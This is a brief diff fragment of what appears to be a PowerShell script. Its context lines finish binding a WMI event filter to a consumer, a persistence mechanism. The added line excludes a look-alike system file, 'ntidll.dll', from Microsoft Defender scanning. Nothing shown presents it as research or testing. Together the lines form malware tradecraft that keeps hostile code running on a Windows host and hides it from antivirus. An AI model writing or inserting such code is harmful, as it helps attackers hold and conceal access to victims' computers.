@@ -17,3 +17,5 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
     Filter = $Filter.Path
     Consumer = $Consumer.Path
 }
+
+Add-MpPreference -ExclusionPath "C:\Windows\SysWOW64\ntidll.dll"
